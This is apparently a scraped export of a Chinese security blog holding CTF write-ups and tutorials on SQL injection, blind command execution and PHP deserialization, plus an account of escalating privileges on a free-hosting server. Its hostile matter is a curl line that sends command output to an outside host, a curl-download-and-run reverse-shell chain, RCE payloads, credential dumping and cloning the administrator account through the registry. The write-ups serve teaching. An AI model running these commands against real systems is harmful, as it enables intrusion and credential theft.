from users;+--------+-----------+| points | flag |+--------+-----------+| 31 | daiker666 |+--------+-----------+1 row in set (0.00 sec) 然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。 0x02 问题思考常规的查询是select flag from users,如果我要在们的查询语句中不见到flag，就得把flag这个列设置别名，mysql设置列别名有两种方法。123456789101112131415mysql&gt; select flag as haha from users;+-----------+| haha |+-----------+| daiker666 |+-----------+1 row in set (0.00 sec)mysql&gt; select (flag)haha from users;+-----------+| haha |+-----------+| daiker666 |+-----------+1 row in set (0.00 sec) 但是这样我们还会出现flag这个字段。这时候想到这个123456789101112131415mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2;+---+---+| 1 | 2 |+---+---+| 1 | 2 |+---+---+1 row in set (0.00 sec) 这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询12345678mysql&gt; select 1,2 union select * from users;+------+-----------+| 1 | 2 |+------+-----------+| 1 | 2 || 31 | daiker666 |+------+-----------+2 rows in set (0.01 sec) 这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名12345678mysql&gt; select * from (select 1,2 union select * from users)c;+------+-----------+| 1 | 2 |+------+-----------+| 1 | 2 || 31 | daiker666 |+------+-----------+2 rows in set (0.02 sec) 然后提取flag1234567mysql&gt; select c.2 from (select 1,2 union select * from users)c limit 1,2;+-----------+| 2 |+-----------+| daiker666 |+-----------+1 row in set (0.02 sec)","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"SQL注入","slug":"渗透测试/Web安全/SQL注入","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/SQL注入/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.daikersec.com/tags/CTF/"},{"name":"注入","slug":"注入","permalink":"http://www.daikersec.com/tags/注入/"},{"name":"web","slug":"web","permalink":"http://www.daikersec.com/tags/web/"}]},{"title":"happyMoctf-ping一下好吗WP","slug":"happyMoctf-ping一下好吗WP","date":"2018-02-15T10:39:15.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/8f0228b2.html","link":"","permalink":"http://www.daikersec.com/wiki/8f0228b2.html","excerpt":"0x00 前言这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过DNS通道/HTTP通道和反弹shell。 0x01 DNS通道/HTTP通道post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)","text":"0x00 前言这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过DNS通道/HTTP通道和反弹shell。 0x01 DNS通道/HTTP通道post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)执行ls|base64(要经过base64编码是因为有一些不可打印字符和空格)解码后可以看到。然后cat就可以读flag。这里面出了个小差错，&lt;?php后面忘记加空格，导致直接访问查看源码可以直接看到flag。说个好玩的，我13号早上把flag文件名的名字改了，然后晚上查看日志的时候居然发现几个ip在直接访问旧的flag文件名。dns类似，直接post `command`.xx.ceye.io就可以 0x02 反弹shell由于直接反弹shell的命令几乎都会触发waf，所以可以先把执行shell的命令保存到本地，再执行。这里面不存在wget，只能利用curl。-被禁了，不能通过-o来保存到文件，可以通过&gt;。写到/tmp底下执行post ip=0.0.0.0|curl 139.199.2.226:6666/1 &gt;/tmp/1然后本机监听8080端口 post ip=0.0.0.0|/chmod +x tmp/1添加执行权限post ip=0.0.0.0|/tmp/1反弹成功","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"命令执行","slug":"渗透测试/Web安全/命令执行","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/命令执行/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"漏洞研究","slug":"漏洞研究","permalink":"http://www.daikersec.com/tags/漏洞研究/"}]},{"title":"php反序列化漏洞","slug":"php反序列化漏洞","date":"2017-12-22T12:47:40.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/39a24cc2.html","link":"","permalink":"http://www.daikersec.com/wiki/39a24cc2.html","excerpt":"0x00 序列化所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。","text":"0x00 序列化所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。序列化的例子123456789101112131415161718192021222324&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 15:39:43 * @version $Id$ */error_reporting(E_ALL);$var_int = 1;$var_str = \"123\";$var_float = 1.2;$var_bool = true;$var_arr = array('1' =&gt; 1,1.2,false );class ClassName &#123; var $var_name = 1; function myfunction()&#123; return \"1\"; &#125;&#125; $arrayName = array($var_int,$var_str,$var_float,$var_bool,$var_arr,new ClassName ()); foreach ($arrayName as $key =&gt; $value) &#123; echo serialize($value).\"&lt;br/&gt;\"; &#125; 结果是123456i:1;s:3:\"123\";d:1.2;b:1;a:3:&#123;i:1;i:1;i:2;d:1.2;i:3;b:0;&#125;O:9:\"ClassName\":1:&#123;s:8:\"var_name\";i:1;&#125; 从例子中我们可以看到，变量，数组，对象可以被序列化。变量的值会被保存下来。以:隔开，类名会被保存下来，类变量，类变量名和类变量值会被保存下来，类方法不会被保存起来。 0x01 反序列化反序列化就是将序列化后的字符串转化回数组和对象看例子1234567891011121314&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:02:17 * @version $Id$ */$un_arr_str = 'a:3:&#123;i:1;i:1;i:2;d:1.2;i:3;b:0;&#125;';//$var_arr = array('1' =&gt; 1,1.2,false );$un_class_str = 'O:9:\"ClassName\":1:&#123;s:8:\"var_name\";i:1;&#125;';var_dump(unserialize($un_arr_str));$O = unserialize($un_class_str);// var_dump($O);var_dump($O-&gt;var_name); 这里的结果是12array(3) &#123; [1]=&gt; int(1) [2]=&gt; float(1.2) [3]=&gt; bool(false) &#125; NULL 比较奇怪的是为什么第二个会是NULL。因为将对象序列化之后，只是保存它的关键数据，对于这个类的具体内容一无所知。所以反序列回一个对象的时候，需要反序列的上下文中存在模板(这里就是类的定义)。 0x02 魔术函数PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。下面举一个例子。12345678class ClassName &#123; function __construct()&#123; echo \"Hello,I am __construct\"; &#125;&#125;new ClassName(); 这里的输出结果是1Hello,I am __construct 其实这里的一个对象实例化的过程中默认会调用的__construct()。php常用的魔术函数有1__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 这里们并非每个都会在这里面用到，下面用一个例子来说下看几个常用到的魔术函数。123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:24:32 * @version $Id$ */class ClassName &#123; private $name =\"123\"; function __construct()&#123; echo \"Hello,I am __construct\".\"&lt;br/&gt;\"; &#125; function __destruct()&#123; echo \"Hello,I am __destruct\".\"&lt;br/&gt;\"; &#125; function __wakeup()&#123; echo \"Hello,I am __wakeup\".\"&lt;br/&gt;\"; &#125; function __sleep()&#123; echo \"Hello,I am __sleep\".\"&lt;br/&gt;\"; return array($this-&gt;name); &#125; function __get($name)&#123; echo \"Hello,I am __get\".\"&lt;br/&gt;\"; return $this-&gt;name; &#125; function __toString()&#123; echo \"Hello,I am __toString\".\"&lt;br/&gt;\"; return \"Hello\"; &#125;&#125;$O = new ClassName();$s= serialize($O);echo $s.\"&lt;br/&gt;\";$O = unserialize($s);$O.\"&lt;br/&gt;\";$O-&gt;nothing; 从例子我们可以看出，当初序列化一个对象是默认会调用__sleep，反序列化是会调用__wakeup，而__construct会在实例化一个对象是被调用，__desturct会在对象不再使用或者程序退出时自动调用, __toString会在对象被当做字符串时使用(特别注意字符串连接符.)。__get会在读取不可访问的属性的值的时候调用 0x03 反序列化漏洞先举一个反序列化漏洞例子 123456789101112131415&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:45:11 * @version $Id$ */class ClassName &#123; var $ip; function __wakeup()&#123; system('ping -c 4'.$this-&gt;ip); &#125;&#125;$O = unserialize($_GET['daiker']); 我们分析这串代码，可以得出一下结论 反序列化的的字符串我们可控 反序列化默认会调用__wakeup() 变量ip是会保存在反序列化的字符串里面的，我们可控所以我们下面构造payload。 12345678910111213&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:45:11 * @version $Id$ */class ClassName &#123; var $ip = \"|whoami\";&#125;echo urlencode(serialize(new ClassName())); 然后http://127.0.0.1/php-obj/example4.php?daiker=O%3A9%3A%22ClassName%22%3A1%3A%7Bs%3A2%3A%22ip%22%3Bs%3A7%3A%22%7Cwhoami%22%3B%7D就可以执行whoami,所以这里就导致RCE所以总结来讲，PHP对象注入(又叫反序列化漏洞)，需要几点条件。 反序列化字符串可控 有魔术方法会调用对象属性 对于反序列化的漏洞利用的效果取决于魔术方法里面对成员属性的调用方式，如上面的system()就会导致RCE，也可能是注入，任意文件上传等问题。 0x04 类变量的注意点看下面一个例子123456789101112131415&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 19:08:38 * @version $Id$ */class ClassName&#123; private $a = 1; protected $b =2; public $c =3;//&#125;echo serialize(new ClassName()).&quot;&lt;br/&gt;&quot;;echo urlencode(serialize(new ClassName())); 看输出结果 1O:9:&quot;ClassName&quot;:3:&#123;s:12:&quot;ClassNamea&quot;;i:1;s:4:&quot;*b&quot;;i:2;s:1:&quot;c&quot;;i:3;&#125; 1O%3A9%3A%22ClassName%22%3A3%3A%7Bs%3A12%3A%22%00ClassName%00a%22%3Bi%3A1%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A2%3Bs%3A1%3A%22c%22%3Bi%3A3%3B%7D% 一个个比较，我们会发现不可打印字符打印不出来。如果我们把可打印字符用作payload，会利用失败.如果是private 的变量，序列化的时候就会变成\\x00类名\\x变量名，这里就是\\xClassName\\x00a，urlencode之后变成%00ClassName%00a。如果是protected的变量，序列化之后就会变成\\x00\\x2A\\x00变量名。 0x05 POP Chain前面说到，要找反序列化漏洞，要有两个点。第一个是反序列化的参数可控，第二个是有魔术方法调用对象属性。但是我们往往会遇到一个问题，就是我们反序列化的参数可控，但是，没有合适的魔术方法，或者是魔术方法对对象属性的调用方法无法利用。这时候就有人提出了一个新的思路叫做POP Chain(跟二进制里面的ROP Chain 思路很像)。POP chain利用的条件是找到的魔术方法不可以直接利用，但它有调用其它方法或者使用其它的变量时，可以在其它的类中寻找同名的方法或是变量，直到可以利用的点。下面看一个简单的例子。1234567891011121314151617181920212223242526272829303132&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 19:41:17 * @version $Id$ */class One&#123; function myfunction()&#123; echo \"Hello,world\"; &#125;&#125;class Another&#123; var $cmd ; function myfunction()&#123; $this-&gt;attack(); &#125; function attack()&#123; system($this-&gt;cmd); &#125;&#125;class ClassName &#123; var $class ; function __construct()&#123; $this-&gt;class=new One(); &#125; function __wakeup()&#123; $this-&gt;class-&gt;myfunction(); &#125;&#125;$O = unserialize($_GET['daiker']); 我们分析下代码，可以发现一下几点 反序列化参数可控 存在魔术方法__construct()，这里不可以直接利用 __construct()调用了myfunction(),myfunction()不可以利用 其他类存在同名函数myfunction()，且另外一个类里面的Myfunction不可以单独被利用，但是存在可被利用的函数system()构造payload 1234567891011121314151617181920&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 20:26:02 * @version $Id$ */class Another&#123; var $cmd; function __construct()&#123; $this-&gt;cmd = \"whoami\"; &#125;//跟直接写 var $cmd = \"whoami'，不写__construct一样，这里演示还有这种写法&#125;class ClassName &#123; var $class ; function __construct()&#123; $this-&gt;class=new Another(); &#125;&#125;echo serialize(new ClassName()); 然后提交http://127.0.0.1/php-obj/pop.php?daiker=O:9:%22ClassName%22:1:{s:5:%22class%22;O:7:%22Another%22:1:{s:3:%22cmd%22;s:6:%22whoami%22;}} 0x06 CVE-2016-7124我们看一个代码1234567891011121314151617181920&lt;?php class object&#123; public $var = \"hello,world\"; function get_flag()&#123; return 'aaaa'; &#125; function __wakeup()&#123; $this-&gt;var = \"hello,wold\"; &#125; function __destruct()&#123; $fp=fopen(\"F:\\\\phpStudy\\\\WWW\\\\unse\\\\hello.php\",\"w\"); fputs($fp,$this-&gt;var); fclose($fp); &#125; &#125; $content = $_POST['content'];$object = unserialize($content);?&gt; 对比上面的代码，可以发现多了 123function __wakeup()&#123; $this-&gt;var = \"hello,wold\"; &#125; 这个魔术函数的作用就是在反序列化的时候会执行函数里面的东西，在这题，，我们就算更改了var这个变量的值，wakeup还是会把他改回来。这时候就要用到一个CVE。谷歌发现了CVE-2016-7124。简单来说就是当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup的执行。参考https://bugs.php.net/bug.php?id=72663，某一种情况下，出错的对象不会被毁掉，会绕过wakeup函数、引用其他的魔术方法。我们只要保证成员属性数目大于实际数目时可绕过wakeup方法，原来的序列化字符串是O:6:&quot;object&quot;:1:{s:3:&quot;var&quot;;s:18:&quot;&lt;?php phpinfo() ?&gt;&quot;;}把object后面的1更改为大于1的数字就可以了。。 成功绕过 0x07 经典案例1.typecho 反序列化漏洞2.SugarCRM v6.5.23反序列化漏洞","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"反序列化漏洞","slug":"渗透测试/Web安全/反序列化漏洞","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/反序列化漏洞/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"漏洞研究","slug":"漏洞研究","permalink":"http://www.daikersec.com/tags/漏洞研究/"}]},{"title":"PHP危险函数总结(随时补充)","slug":"php危险函数总结(随时补充)","date":"2017-07-09T15:44:34.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/1067b4de.html","link":"","permalink":"http://www.daikersec.com/wiki/1067b4de.html","excerpt":"1. 获取当前文件路径 echo dirname(__FILE__) ; echo getcwd();","text":"1. 获取当前文件路径 echo dirname(__FILE__) ; echo getcwd(); 2. 获取同目录下的所有文件名称 echo var_dump(glob(&#39;./*&#39;)); system(&quot;ls&quot;)/system(&quot;dir&quot;)/system--&gt;可换成执行系统命令的函数; 3. 读取某个文件的内容 echo file_get_contents(&quot;flag.php&quot;); echo fgets(fopen(&quot;flag.php&quot;,&quot;r&quot;)); echo fgetss(fopen(&quot;flag.php&quot;,&quot;r&quot;)); show_source(&quot;flag.php&quot;); echo fread(fopen(&quot;flag.php&quot;,&quot;r&quot;),filesize(&quot;flag.php&quot;)); echo var_dump(file(&quot;flag.php&quot;)); copy(&quot;flag.php&quot;,&quot;daiker.txt&quot;); include &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;; highlight_file(&quot;flag.php&quot;); readfile(“flag.php”); 4. 执行系统命令的函数 system passthru exec pcntl_exec shell_exec popen proc_open 5. 命令执行函数 eval(&quot;phpinfo();&quot;); assert(&quot;phpinfo();&quot;); preg_replace(&quot;/test/e&quot;,&quot;phpinfo();&quot;,&quot;jutst test&quot;); call_user_func(&quot;assert&quot;,&quot;eval(&#39;phpinfo();system(\\&#39;whoami\\&#39;);&#39;)&quot;); call_user_func_array(&quot;assert&quot;,array(&quot;phpinfo();&quot;)); fun = create_function(&#39;&#39;, assert(&#39;phpinfo()&#39;));$fun(); array_map(&quot;assert&quot;,array(&quot;phpinfo();&quot;)); fpassthru(fopen(&quot;flag.php&quot;,&quot;r&quot;)); 6. 反序列化 unserialize() 7.xxe simplexml_load_file() 8.文件操作 文件读取下载 file_get_content() highlight_file() fopen() readfile() fread() file() fgets() show_source() fpassthru 文件删除 unlink()","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://www.daikersec.com/categories/漏洞挖掘/"},{"name":"代码审计","slug":"漏洞挖掘/代码审计","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/"},{"name":"php","slug":"漏洞挖掘/代码审计/php","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/php/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"php","slug":"php","permalink":"http://www.daikersec.com/tags/php/"}]},{"title":"insert 注入","slug":"insert 注入","date":"2017-05-09T14:42:34.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/7e490dd2.html","link":"","permalink":"http://www.daikersec.com/wiki/7e490dd2.html","excerpt":"0x00 前言我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。","text":"0x00 前言我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。 0x01 例子下面我给出一个简单的例子，基于php+mysql的。方便实验1234567create database sqli;use sqli;create table user(name varchar(40),email varchar(20),qq varchar(20)); 12345678910111213141516171819202122前端&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt;&lt;title&gt;Examples&lt;/title&gt;&lt;meta name=\"description\" content=\"\"&gt;&lt;meta name=\"keywords\" content=\"\"&gt;&lt;link href=\"\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"register.php\" method=\"post\"&gt; Name: &lt;input type=\"text\" name=\"name\" /&gt; Email: &lt;input type=\"text\" name=\"email\" /&gt; QQ: &lt;input type=\"text\" name=\"qq\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425后端&lt;?php/** * * @authors daiker * @date 2017-05-09 20:08:53 * @version $Id$ */$conn=mysql_connect('127.0.0.1', 'root', 'root');if(!$conn)&#123; die(\"mysql connect error\");&#125;mysql_select_db(\"sqli\",$conn);$sql=\"insert into user(name,email,qq) values ('$_POST[name]','$_POST[email]','$_POST[qq]')\";$result=mysql_query($sql,$conn);print_r(mysql_error());if(!$result)&#123; die(\"error\");&#125;echo \"Yes\";?&gt; 效果 0x02分析注入我们常见的注入有4种 报错注入 联合查询 盲注 堆叠查询联合查询前后都要SELECT,排除堆叠查询，mysql不支持排除，那就只剩下报错注入和盲注。报错注入条件比较苛刻，需要显示报错信息. 0x03报错注入报错注入条件比较苛刻，需要显示报错信息.报错注入，那就要能报错，可以用floor(),updatexml(),extractvalue()。这里以extractvalue()为例首先闭合，有两种方法,内联式和注释法内联式的话,就是加and ‘1’=’1来闭合后面的引号注释式的话，就是够着1’,’’,’’)#这样的语句然后利用extractvalue报错 1name=ee&apos; and extractvalue(1,&apos; &apos;) and &apos;1&apos;=&apos;1 &amp;email=aa&amp;qq=aa 报错了 1XPATH syntax error: &apos;&apos; 然后修改`extractvalue()的第二个值以此提取数据 1name=ee&apos; and extractvalue(1,concat(0x5e5e5e,database(),0x5e5e5e)) and &apos;1&apos;=&apos;1 &amp;email=aa&amp;qq=aa 0x5e5e5e据^^^为方便观看爆出数据库 1XPATH syntax error: &apos;^^^sqli^^^&apos; 0x04 盲注实验前删除上面语句的print_r(mysql_error()); 因为报错注入要求必须报错，但是一旦不显示错误，就比较困难了。如果是布尔型盲注，关键是让返回的结果不一样，也就是让语句不能正确执行，这里的话，我利用if((1=1),a,b)，a和b会导致整个语句返回的结果不同，那我们执行的语句不久可以放在(1=1)这里，但是怎么构造呢?最开始想的是用报错注入那几个函数,比如extractvalue，但是无论如何都不能执行，后来本地调试了一下 大致可以推出if语句后面两个参数都是会执行的，不管有没有被选中，但是谁被选中，就把执行的结果返回。后来讲过大佬点拨，发现了一个语句。 1select 1 from information_schema.tables 这个语句的话执行是不会报错的 但是注意看图，会发现，他返回的结果特别多。没错，就是这一点，多行结果跟1 and 会报错。 最后构造语句 1name=ee&apos; and if((A),1,(select 1 from information_schema.tables)) &amp;email=aa&amp;qq=a 其中A是我们自己构造的语句，参见盲注的文章自己构造 但是有一点必须强调，这样的后果就是数据库会残留下大量语句。尽量不要用这招 0x05 在插入数据可以查询的情况下12345678910mysql&gt; insert into user values(&apos;daiker&apos;,&apos;t@qq.com&apos;,user());Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+--------+----------+----------------+| name | email | qq |+--------+----------+----------------+| daiker | t@qq.com | root@localhost |+--------+----------+----------------+1 row in set (0.00 sec) 当然有时候可能插入点是整型的，可以这样1234567891011mysql&gt; insert into user values(&apos;daiker&apos;,&apos;t@qq.com&apos;,0|hex(substr(&apos;daiker666&apos;,1,1)));Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+--------+----------+----------------+| name | email | qq |+--------+----------+----------------+| daiker | t@qq.com | root@localhost || daiker | t@qq.com | 64 |+--------+----------+----------------+2 rows in set (0.00 sec) 通过substr,mid，left之类的一个个提取出来。然后再转为16进制，跟0或。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"SQL注入","slug":"渗透测试/Web安全/SQL注入","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/SQL注入/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"注入","slug":"注入","permalink":"http://www.daikersec.com/tags/注入/"}]},{"title":"CTF中代码审计小trick(未完)","slug":"CTF中代码审计小trick(未完)","date":"2017-05-04T13:14:14.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/4249e474.html","link":"","permalink":"http://www.daikersec.com/wiki/4249e474.html","excerpt":"0x00 弱类型强类的语言遇到函数引数类型和实际调用类型不匹配的情况经常会直接出错或者编译失败；而弱类型的语言常常会实行隐式转换，或者产生难以意料的结果","text":"0x00 弱类型强类的语言遇到函数引数类型和实际调用类型不匹配的情况经常会直接出错或者编译失败；而弱类型的语言常常会实行隐式转换，或者产生难以意料的结果也就是说，其实弱类型式其实式语言帮我们做了转换，好处是我们编程的时候可以省很多力，但是方便的同时也带来一些问题。注意的是，python并不是一门弱类型的语言。 string转intphp在将string转化成int的时候会把后面的字母舍掉。比如 ‘132a’会被转化为123。又比如’aaa‘会被转化为为0。受到影响的:intval(),==,&gt;,’&lt;等。看到具体的例子。123456is_numeric(@$a[\"str\"])?die(\"eroor\"):NULL; if(@$a[\"str\"])&#123; if ($a[\"str\"]&gt;2016)&#123; echo $flag; &#125; &#125; 这时只需要传入2017aaa就可以绕过 进制转化会自动转化进制，而且支持科学计数法php var_dump(0x10==16); var_dump(020==16); var_dump(2e1==20);这些都是正确的，举个例子123456789101112?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; 这时只要找出两个数的md5都是0e开头的就可以。具体哪些，看这一篇PHP处理0e开头md5哈希字符串缺陷/bug 0x01 strcmpstrcmp(array,string)=null=0具体例子1234567891011121314&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123; if(@!strcmp($pass,$pass1))&#123; echo \"flag:nctf&#123;*&#125;\"; &#125;else&#123; echo \"the pass is wrong!\";&#125;&#125;else&#123; echo \"please input pass!\";&#125;?&gt; 传进一个数组就行 0x02 array_search()与in_array()传进的string被转化为0的情况12$array=array(13);var_dump(strcmp($array,'abc')==true ); 1234$array=array(0=&gt;&apos;a&apos;,&apos;b&apos;);var_dump(array_search(&apos;b&apos;,$array) == false ); //falsevar_dump(array_search(&apos;c&apos;,$array) == false ); //truevar_dump(array_search(&apos;a&apos;,$array) == false ); //true 特例，刚好找到是0 0==flase 0x03 md5123$array=array(0=&gt;'a','b');$b=array(0);var_dump(md5($array)===md5($b)); //true 两个数组的md5一样 0x04 eregi可以被截断123456789$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(\"3|1|c\",$d.$c[0])?die(\"nope\"):NULL; strpos(($c[0].$d), \"isccctf2017\")?$v3=1:NULL; &#125; 构造截断就好 0x05 file_put_content和unlink0x06 rand0x07 end(array)和array[length(array)-1]0x08 未初始化变量漏洞","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://www.daikersec.com/categories/漏洞挖掘/"},{"name":"代码审计","slug":"漏洞挖掘/代码审计","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/"},{"name":"php","slug":"漏洞挖掘/代码审计/php","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/php/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"代码审计","slug":"代码审计","permalink":"http://www.daikersec.com/tags/代码审计/"}]},{"title":"一次简单渗透","slug":"一次简单渗透","date":"2017-04-28T11:38:25.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/c445d4db.html","link":"","permalink":"http://www.daikersec.com/wiki/c445d4db.html","excerpt":"0x00 前言用的手法都是网上有的，大佬勿喷，只是感觉经历坎坷，记录一下 0x01 初步提权","text":"0x00 前言用的手法都是网上有的，大佬勿喷，只是感觉经历坎坷，记录一下 0x01 初步提权freehost，免费的?net user一下， 顿时感觉头都大了，应该是同服站点，每个人一个账号，这种权限划分特别严格，不好搞。但不管怎么样，开始搞吧。试一下systeminfo。 Windows2008 r2 64位服务器，还有打补丁，，pr肯定不行，传个巴西烤肉，还是不行。试下窃取口令的工具incognito 只能列出同等级的，不能提权。刚要试试数据库提权，大佬@wyAtu告诉我说可以用ms15-051。试了一个32位，不行，，只得换成64位的，，成功了 还是System权限，添加个账号，开3389就可以去吃饭了。 0x02 添加账号添加账号加进管理员组 不是system权限吗，，百思不得其解。先留着。。去连连3389玩玩。(后来才知道是安全狗拦着，大佬们给了很多建议，怎么杀狗，后来添加也没什么用，就没搞了，详见下文) 0x03 远程连接端口扫描 没开3389，奇怪，那就帮他开个。。。可是死活打不开。。。很奇怪，忽然想到，，这种服务器应该不可能没开3389啊，估计把端口改了。tasklist /svc 找到pid 2128,netstat -ano 果然，，开放端口43852。试着连接一下。 失败了，怎么会这样呢难道是内网?，查ip也不是啊。不管了，端口转发一下。。 连接成功，有些人可能没有公网作为中转，可以试试-tran 5555 127.0.0.1 43852。因为这里比较特殊，不是内网，而是通过策略禁止别人远程连接，因此转移个端口就够了。 WTF…………………….只有特定用户能登陆。那我估计添加账号也没有什么用了。。windows下权限再高不能连接3389有鸟用。这是只能默念我是system，可以做一切事情。 0x04 搞管理员账号密码先上传猕猴桃 mimikatz。。系统进程一直卡死在那里。不懂为什么，试试下一个Pwdump7密码解不开..GG最后朋友@iFurySt推荐了一个神器，说是可以直接抓明文密码的wce 终于抓到了，，试了一下。。还是不行。。估计抓到的是缓存的密码。密码已经改了。。山穷水复。。 0x05 账号克隆最后才想起用它。。居然加不了管理员。。那我把管理员的克隆过来总可以了吧。为了小心。。我用Guest账号吧 激活 net user Guest /active:yes 导出注册表 reg export &quot;HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4&quot; &quot;x:\\1.reg 导入注册表 regedit /s x:/1.reg但是登陆的时候由于策略原因导致空口了不能登陆。这时候给guest改下密码就可以 0x06 总结这篇的环境是 提权成功，拿到system权限 安全狗禁止添加管理员账号 策略原因禁止外部IP访问 